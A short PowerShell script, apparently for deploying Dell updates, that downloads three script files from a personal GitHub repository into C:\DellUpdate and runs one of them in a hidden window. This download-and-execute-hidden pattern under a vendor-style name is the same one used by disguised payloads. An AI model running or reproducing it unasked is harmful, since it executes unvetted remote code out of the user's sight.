New-Item -Path 'C:\DellUpdate' -ItemType Directory -Force
$sourceps1 = 'https://raw.githubusercontent.com/khalilhasanzade/Dellupdate/main/dell.ps1'
$destinationps1 = 'C:\DellUpdate\Dell.ps1'
Invoke-WebRequest -Uri $sourceps1 -OutFile $destinationps1
$sourcemsg = 'https://raw.githubusercontent.com/khalilhasanzade/Dellupdate/main/usermsg.vbs'
$destinationmsg = 'C:\DellUpdate\usermsg.vbs'
Invoke-WebRequest -Uri $sourcemsg -OutFile $destinationmsg
$sourcebatch = 'https://raw.githubusercontent.com/khalilhasanzade/Dellupdate/main/Dell_update.bat'
$destinationbatch = 'C:\DellUpdate\Dell_update.bat'
Invoke-WebRequest -Uri $sourcebatch -OutFile $destinationbatch
PowerShell.exe -windowstyle hidden -File  "C:\DellUpdate\Dell.ps1"